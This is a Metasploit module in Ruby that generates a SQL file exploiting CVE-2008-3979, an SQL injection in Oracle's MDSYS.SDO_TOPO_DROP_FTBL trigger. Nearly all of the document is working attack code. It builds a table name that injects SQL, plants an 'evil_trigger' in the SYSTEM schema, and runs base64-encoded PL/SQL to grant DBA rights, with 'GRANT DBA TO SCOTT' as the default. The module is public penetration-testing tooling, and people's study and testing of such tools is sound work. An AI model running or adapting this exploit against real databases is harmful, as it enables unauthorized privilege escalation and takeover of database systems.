##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB SQL Injection in MDSYS.SDO_TOPO_DROP_FTBL Trigger',
      'Description'    => %q{
          This module will escalate an Oracle DB user to MDSYS by exploiting a sql injection bug in
          the MDSYS.SDO_TOPO_DROP_FTBL trigger. After that exploit escalate user to DBA using "CREATE ANY TRIGGER" privilege
          given to MDSYS user by creating evil trigger in system scheme (2-stage attack).
      },
      'Author'         => [ 'Sh2kerr <research[ad]dsec.ru>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-3979' ],
          [ 'OSVDB', '51354' ],
          [ 'URL', 'http://www.securityfocus.com/archive/1/500061' ],
          [ 'URL', 'http://www.ngssoftware.com/' ],
        ],
      'DisclosureDate' => 'Jan 13 2009'))

      register_options(
        [
          OptString.new('SQL',      [ false, 'The SQL to execute.',  'GRANT DBA TO SCOTT']),
          OptString.new('USER',      [ false, 'The current user. ',  'SCOTT']),
          OptString.new('FILENAME', [ false, 'The file name.',  'msf.sql'])
        ])
  end

  def run
    name1  = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    name2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand1 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand2 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand3 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand4 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)
    rand5 = Rex::Text.rand_text_alpha_upper(rand(10) + 1)

    function1 = %Q|
      CREATE OR REPLACE PROCEDURE #{name1}
      AUTHID CURRENT_USER AS
      PRAGMA AUTONOMOUS_TRANSACTION;
      BEGIN EXECUTE IMMEDIATE '#{datastore['SQL']}';
      END;
      |


    function2 = %Q|
      CREATE OR REPLACE FUNCTION #{name2} RETURN number AUTHID CURRENT_USER is
      PRAGMA AUTONOMOUS_TRANSACTION;
      STMT VARCHAR2(400):= 'create or replace trigger system.evil_trigger before insert on system.DEF$_TEMP$LOB DECLARE msg VARCHAR2(10);
      BEGIN #{datastore['USER']}.#{name1};
      end evil_trigger;';
      BEGIN
      EXECUTE IMMEDIATE STMT;
      COMMIT;
      RETURN 1;
      END;
      |

    prepare ="create table \"O' and 1=#{datastore['USER']}.#{name2}--\"(id number)"

    exploiting1 ="drop table \"O' and 1=#{datastore['USER']}.#{name2}--\""

    exploiting2 = "insert into system.DEF$_TEMP$LOB (TEMP$BLOB) VALUES ('AA')"

    fun1  = Rex::Text.encode_base64(function1)
    fun2 = Rex::Text.encode_base64(function2)
    prp  = Rex::Text.encode_base64(prepare)
    exp1 = Rex::Text.encode_base64(exploiting1)
    exp2 = Rex::Text.encode_base64(exploiting2)


    sql = %Q|
      DECLARE
      #{rand1} VARCHAR2(32767);
      #{rand2} VARCHAR2(32767);
      #{rand3} VARCHAR2(32767);
      #{rand4} VARCHAR2(32767);
      #{rand5} VARCHAR2(32767);
      BEGIN
      #{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{fun1}')));
      EXECUTE IMMEDIATE #{rand1};
      EXECUTE IMMEDIATE 'GRANT EXECUTE ON #{name1} TO PUBLIC';
      #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{fun2}')));
      EXECUTE IMMEDIATE #{rand2};
      EXECUTE IMMEDIATE 'GRANT EXECUTE ON #{name2} TO PUBLIC';
      #{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp}')));
      EXECUTE IMMEDIATE #{rand3};
      #{rand4} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp1}')));
      EXECUTE IMMEDIATE #{rand4};
      #{rand5} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp2}')));
      EXECUTE IMMEDIATE #{rand5};
      END;
      /
      DROP FUNCTION #{name1};
      DROP FUNCTION #{name2};
      |


    print_status("Creating '#{datastore['FILENAME']}' file ...")
    file_create(sql)


  end
end
